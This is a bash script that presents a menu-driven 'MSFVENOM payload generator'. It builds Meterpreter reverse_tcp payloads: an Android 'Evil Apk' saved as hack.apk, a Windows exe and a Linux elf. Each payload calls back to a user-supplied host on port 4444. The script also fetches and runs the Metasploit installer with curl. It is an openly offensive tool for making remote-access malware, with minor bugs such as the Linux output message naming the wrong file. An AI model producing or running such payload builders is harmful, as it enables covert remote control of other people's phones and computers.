#!/bin/bash

function check_root() {
	if [ $EUID -ne 0 ]; then
		echo """
		        ###################
                        #Must run as root!#
		        ###################
		      
		                           """

		exit 1
	else
		clear
	fi
}

function check_metasploit() {
if ! command -v msfconsole &> /dev/zero; then
	curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
	    chmod 755 msfinstall && \
    	    ./msfinstall

fi
}

function welcome_screen() {
	sleep 2
	clear
	echo """
	        ###########################################
	        #Welcome to the MSFVENOM payload generator#
	        ###########################################
	                                                
		                                           """

}

function main_menu() {
	echo """
	       	-----------------------------
       	       |    MSFVENOM PAYLOAD TOOL    |
		-----------------------------
	       | 1. Android Evil Apk         |
	       | 2. Windows Reverse shell    |
	       | 3. Linux Reverse shell      |
	       | 0. Exit                     |
	       ------------------------------

	                                    """
}

function android_apk() {
	echo "-----Android Evil Apk-----"
	
	read -p "Enter IP address of the target: " lhost

	echo "Generating Payload..."
msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 R> $HOME/hack.apk
	echo "hack.apk is stored in $HOME directory."
	sleep 2
	clear
}

function windows_rev() {
	echo "-----Windows Reverse shell-----"

	read -p "Enter IP address of the target: " lhost

	echo "Generating Payload..."
msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 -f exe> $HOME/windowsrev.exe
	echo "windowsrev.exe is stored in $HOME directory."
	sleep 2
	clear
}

function linux_rev() {
       	echo "-----Linux Reverse shell-----"

       	read -p "Enter IP address of the target: " lhost

	echo "Generating Payload..."       
msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 -f elf> $HOME/linuxrev.elf
	echo "linuxrev.exe is stored in $HOME directory."
	sleep 2
	clear
}



function __main__(){
	check_root
	check_metasploit
	welcome_screen
	sleep 3

	while [ 1 ]
	do
		main_menu
		read -p "Enter your choice: " CHOICE
		case $CHOICE in
			1) android_apk ;;
			2) windows_rev ;;
			3) linux_rev ;;
			0) exit ;;
			*) echo "Inavlid choice";
		esac
	done
		
}


__main__

